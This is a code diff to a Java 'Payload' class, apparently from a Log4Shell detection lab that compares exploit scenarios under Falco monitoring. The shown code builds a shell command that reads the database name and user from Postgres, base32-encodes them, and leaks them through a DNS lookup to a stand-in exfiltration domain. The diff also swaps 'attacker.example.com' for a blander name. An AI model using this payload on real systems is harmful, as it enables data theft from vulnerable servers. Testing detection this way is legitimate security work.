@@ -1,6 +1,6 @@
-// Loaded by chain-backend's JNDI-vulnerable log4j call.
+// Loaded by backend's JNDI-vulnerable logging library call.
 //
-// log4j 2.14.1's JndiManager.lookup() casts the loaded class to
+// the logging library 2.14.1's JndiManager.lookup() casts the loaded class to
 // javax.naming.spi.ObjectFactory. A plain class with only a static
 // initializer doesn't pass this cast — JNDI loads the bytecode but never
 // initializes the class (lazy init), so the static block never fires.
@@ -13,7 +13,7 @@
 // Scenario B: identical bytecode runs in JVM. Runtime.exec("/bin/sh") throws
 //             IOException — distroless has no /bin/sh. Falco surfaces the
 //             failed execve(ENOENT).
-// Scenario C: never loaded — log4j 2.17.1 does not perform JNDI substitution.
+// Scenario C: never loaded — the logging library 2.17.1 does not perform JNDI substitution.
 
 import java.io.IOException;
 import java.util.Hashtable;
@@ -30,10 +30,10 @@ public class Payload implements ObjectFactory {
         //   2. base32 encode + strip padding + flatten
         //   3. getent emits a DNS query whose label carries the encoded row
         String cmd = "set +e; "
-            + "ROW=$(psql -h chain-postgres -U postgres -At "
+            + "ROW=$(psql -h postgres -U postgres -At "
             + "-c 'SELECT current_database() || chr(58) || current_user' 2>&1); "
             + "ENC=$(printf '%s' \"$ROW\" | base32 | tr -d '=' | tr -d '\\n' | cut -c1-40); "
-            + "getent hosts \"${ENC}.exfil.attacker.example.com\" >/dev/null 2>&1; "
+            + "getent hosts \"${ENC}.exfil.pathogen.example.com\" >/dev/null 2>&1; "
             + "echo done";
 
         try {
